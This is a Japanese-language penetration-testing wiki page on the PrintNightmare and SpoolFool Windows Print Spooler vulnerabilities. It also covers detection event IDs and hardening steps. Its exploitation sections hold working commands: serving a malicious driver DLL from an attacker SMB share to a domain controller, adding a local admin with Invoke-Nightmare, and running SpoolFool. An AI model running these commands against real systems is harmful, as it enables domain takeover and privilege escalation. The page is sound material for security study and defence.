# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmareは、Windowsの**Print Spooler**サービスに存在する一連の脆弱性の総称です。これらの脆弱性により、**SYSTEMとして任意のコードを実行**でき、スプーラーにRPC経由でアクセスできる場合は、**ドメインコントローラーやファイルサーバーでリモートコード実行（RCE）**が可能になります。最も広く悪用されたCVEは、**CVE-2021-1675**（当初はLPEに分類）と**CVE-2021-34527**（完全なRCE）です。その後に発見された**CVE-2021-34481（「Point & Print」）**や**CVE-2022-21999（「SpoolFool」）**などの問題から、攻撃対象領域がまだ十分に閉じられていないことがわかります。

**ドライバーを利用したRCE/LPE**ではなく、スプーラー経由の**認証強制／リレー**について調べている場合は、[プリンター強制認証の悪用に関するこちらのページ](printers-spooler-service-abuse.md)を確認してください。このページでは、**SYSTEMとしてドライバー／DLLを読み込むこと**に焦点を当てています。

---

## 1. 脆弱なコンポーネントとCVE

| 年 | CVE | 通称 | プリミティブ | 備考 |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|2021年6月のCUで修正されたが、CVE-2021-34527で回避された|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx`により、認証済みユーザーがリモート共有からドライバーDLLを読み込める。2021年8月以降は通常、弱められたPoint & Printポリシーが必要|
|2021|CVE-2021-34481|“Point & Print”|LPE|非管理者ユーザーによる署名なしドライバーのインストール|
|2022|CVE-2022-21999|“SpoolFool”|LPE|任意のディレクトリ作成 → DLLの配置。2021年のパッチ適用後も動作|

これらはすべて、**MS-RPRN / MS-PAR RPCメソッド**（`RpcAddPrinterDriver`、`RpcAddPrinterDriverEx`、`RpcAsyncAddPrinterDriver`）または**Point & Print**内の信頼関係を悪用します。

## 2. Exploitation techniques

### 2.1 リモートのDomain Controller侵害（CVE-2021-34527）

認証済みの**非特権**ドメインユーザーは、次の方法でリモートスプーラー（多くの場合DC）上で**NT AUTHORITY\SYSTEM**として任意のDLLを実行できます。

```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
       -f \
       '\\attacker_IP\share\evil.dll'
```

一般的な PoC には、**CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#）、および **mimikatz** の Benjamin Delpy による `misc::printnightmare / lsa::addsid` モジュールがあります。

### 2.2 ローカル privilege escalation（サポート対象のすべての Windows、2021-2024）

同じ API を**ローカルで**呼び出し、`C:\Windows\System32\spool\drivers\x64\3\` からドライバーを読み込むことで、SYSTEM 権限を取得できます：

```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```

### 2.3 パッチ適用済みホストでの最新のトリアージ

完全に更新されたホストでは、Windows がプリンタードライバーのインストールを**管理者のみに制限**する設定を既定にしているため（2021年8月10日以降、`RestrictDriverInstallationToAdministrators=1`）、公開されている PrintNightmare PoC は失敗することがよくあります。ターゲットに exploit を試す前に、レガシープリンターの導入を目的に環境でこの安全対策が元に戻されていないか、まず確認してください:<sup>[[3]](#references)</sup>

```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```

特に注目すべき脆弱な値は通常、次のとおりです。<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

PoCを実行する前に、Linuxから対象が関連するprint RPCインターフェースを公開していることを手早く確認します。

```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```

最近の公開ツールの中には、DLLを送信する前に、より安全な**check/list**ワークフローを提供するものもあります:

```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```

> 低権限ユーザーとして `RPC_E_ACCESS_DENIED` (`0x0001011b`) が発生した場合、通常は通信障害ではなく、2021年以降のデフォルト設定によるものです。

> Windows 11 22H2以降および新しいクライアントビルドでは、リモート印刷のデフォルトは **RPC over TCP** であり、**RPC over named pipes** (`\PIPE\spoolss`) は明示的に再有効化しない限り無効です。古いPoCやラボのメモでは、named pipeに接続できることが前提になっている場合があります。<sup>[[4]](#references)</sup>

### 2.4 「パッチ適用済み」ネットワークでのPackage Point & Printの悪用

多くのエンタープライズ環境では、ヘルプデスクやプリントサーバーのワークフローで、管理者以外のユーザーによるドライバーのインストールや更新が依然として必要だったため、2021年の最初のパッチ適用後も**ポリシー上は脆弱な状態**が続いていました。実際の攻撃手順は次のようになります。

- セキュリティプロンプトが完全に無効化されている場合、**従来の任意DLLを使ったPrintNightmare**が依然として最短経路です。
- `Only use Package Point and Print` が有効な場合、通常は生のDLLを配置するのではなく、**署名済みのパッケージ対応ドライバー**を使う経路へ切り替える必要があります。<sup>[[3]](#references)</sup>
- 2024年の研究では、**`Package Point and Print - Approved servers` だけでは強固な信頼境界にならない**ことが示されました。攻撃者が承認済みプリントサーバーの名前解決を偽装または乗っ取れる場合、ポリシーチェックを満たす悪意あるサーバーへ被害者を誘導できます。<sup>[[4]](#references)</sup>
- UNC hardeningとRPC over SMBの強制を併用しても、最新のクライアントが**RPC over TCPへフォールバック**する可能性があるため、確実とは限りません。<sup>[[4]](#references)</sup>

このため、最新のPrintNightmare系の悪用では、元の2021年のPoCをそのまま再利用するよりも、**エンタープライズのプリンター展開ポリシーを悪用すること**が中心になる場合がよくあります。

### 2.5 SpoolFool (CVE-2022-21999) – 2021年の修正を回避する

Microsoftの2021年のパッチはリモートからのドライバー読み込みをブロックしましたが、**ディレクトリのアクセス許可は強化しませんでした**。SpoolFoolは `SpoolDirectory` パラメーターを悪用して `C:\Windows\System32\spool\drivers\` の下に任意のディレクトリを作成し、ペイロードDLLを配置して、スプーラーにそれを読み込ませます。<sup>[[2]](#references)</sup>

```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```

> この exploit は、2022年2月の更新プログラム適用前であれば、完全にパッチ適用済みの Windows 7 → Windows 11 および Server 2012R2 → 2022 で動作します<sup>[[2]](#references)</sup>

---

## 3. 検出とハンティング

* **PrintService logs** – *Microsoft-Windows-PrintService/Operational* チャネルを有効にし、成功・失敗を問わず **Event ID 316**（ドライバーの追加・更新。通常は DLL 名を含む）を監視します。不審なスプーラーモジュール／ドライバーの読み込み失敗については、**Event ID 808/811** と組み合わせて確認します。
* **Sysmon** – 親プロセスが **spoolsv.exe** の場合に、`C:\Windows\System32\spool\drivers\*` 内で発生する `Event ID 7`（イメージの読み込み）または `11/23`（ファイルの書き込み／削除）。
* **プロセスの系譜** – **spoolsv.exe** が `cmd.exe`、`rundll32.exe`、PowerShell、または予期しない未署名の子プロセスを起動した場合は、必ずアラートを発生させます。
* **ネットワークテレメトリ** – **spoolsv.exe** から攻撃者が管理する共有への予期しない SMB 取得や、プリントサーバーとして動作するはずのないサーバーからの異常なプリンター RPC トラフィックは、いずれも有力な手掛かりです。

## 4. 緩和策とハードニング

1. **パッチを適用!** – Print Spooler サービスがインストールされているすべての Windows ホストに、最新の累積更新プログラムを適用します。
2. **不要な場所ではスプーラーを無効にします**。特に Domain Controller では無効にします。
   ```powershell
   Stop-Service Spooler -Force
   Set-Service Spooler -StartupType Disabled
   ```
3. **ローカル印刷を許可したままリモート接続をブロック** – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Point & Print を管理者のみに制限**するには、次の設定を行います。
   ```cmd
   reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
           /v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
   ```
   Microsoft KB5005652<sup>[[1]](#references)</sup>の詳細なガイダンス
5. 業務上の要件により `RestrictDriverInstallationToAdministrators=0` にせざるを得ない場合は、他のプリンター ポリシーはすべて**部分的な緩和策にすぎない**と考えてください。最低限、**パッケージ対応ドライバー**を優先し、**Only use Package Point and Print**を有効にして、**Package Point and Print - Approved servers**を明示的に指定したフォレスト内のプリントサーバーに制限してください。<sup>[[3]](#references)</sup>
6. プリンターのマッピング障害を直すためだけに、プリンター RPC のプライバシー設定を**ロールバックしないでください**。`RpcAuthnLevelPrivacyEnabled=0` に設定している環境は、**CVE-2021-1678** 対策として追加されたハードニングを元に戻しているため、通常、エンゲージメント中に特に注意して調査する必要があります。<sup>[[4]](#references)</sup>

---

## 5. 関連する調査 / ツール

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) モジュール
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – `-check`、`-list`、`-delete` モードを備えた標準的な Impacket 実装
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – SMB による配信機能を内蔵し、複数ターゲットに対応、`MS-RPRN` / `MS-PAR` の両モードを備えたラッパー
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – package Point & Print を通じて、持ち込みの脆弱なプリンタードライバーを悪用
* SpoolFool exploit と解説記事
* SpoolFool およびその他の spooler のバグに対する 0patch の micropatch

ドライバーを読み込む代わりに spooler 経由で**認証を強制**したい場合は、[プリンター spooler サービスの悪用](printers-spooler-service-abuse.md)に進んでください。

---

## References

- [1] [Microsoft – KB5005652: 新しい Point & Print の既定のドライバー インストール動作を管理する](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – 2024年版 PrintNightmare 実践ガイド](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – PrintNightmare はまだ終わっていない](https://itm4n.github.io/printnightmare-not-over/)
{{#include ../../banners/hacktricks-training.md}}
